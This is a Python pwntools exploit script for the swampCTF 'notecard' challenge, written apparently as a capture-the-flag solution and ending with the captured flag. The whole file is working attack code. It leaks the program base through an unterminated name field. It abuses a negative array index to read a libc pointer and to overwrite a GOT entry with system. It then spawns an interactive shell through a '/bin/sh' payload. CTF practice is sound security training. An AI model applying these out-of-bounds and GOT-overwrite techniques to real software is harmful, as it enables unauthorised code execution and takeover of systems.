from pwn import *

e = ELF("./notecard_patched")
libc = ELF("./libc6_2.39-0ubuntu7_amd64.so")
ld = ELF("./ld-2.39.so")
context.binary = e

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)


p = remote("chals.swampctf.com", 40002)
#p = process("./notecard_patched")

'''
'''

script = '''
brva 0x1301
brva 0x14CF
'''

#p = gdb.debug("./notecard_patched", gdbscript = script)

# leak code base
payload = b"/bin/sh||".ljust(0x18, b"A")
p_sla(b"name:\n", payload)
p_sla(b"(y/n)?\n", b"n")
p_recvut(payload)
code_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x1270
print(hex(code_base))

# leak libc via got in binary

p_sla(b"write\n> \n", b"2")
p_sla(b"number (0 - 4): ", b"4")
stdout = code_base + 0x3fd0
puts_got = code_base + e.got['puts']
setbuf_got = code_base + e.got['setbuf']
printf_got = code_base + e.got['printf']
read_got = code_base + e.got['read']
payload = p64(stdout) + p64(puts_got) + p64(setbuf_got) + p64(printf_got) + p64(read_got)
p_s(payload)


p_sla(b"write\n> \n", b"1")
p_sla(b"number (0 - 4): ", b"-6")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - 0x2046a8
print(hex(libc_base))

'''
p_sla(b"write\n> \n", b"1")
p_sla(b"number (0 - 4): ", b"-5")
libc_base = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(libc_base))

p_sla(b"write\n> \n", b"1")
p_sla(b"number (0 - 4): ", b"-4")
libc_base = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(libc_base))

p_sla(b"write\n> \n", b"1")
p_sla(b"number (0 - 4): ", b"-3")
libc_base = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(libc_base))

p_sla(b"write\n> \n", b"1")
p_sla(b"number (0 - 4): ", b"-2")
libc_base = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(libc_base))
'''

system = libc_base + libc.symbols['system']

p_sla(b"write\n> \n", b"2")
p_sla(b"number (0 - 4): ", b"-5")
p_s(p64(system))

p_sla(b"write\n> \n", b"0")

p.interactive()
#swampCTF{5tudy_h@rd_@nd_5t@y_1n_5ch00l}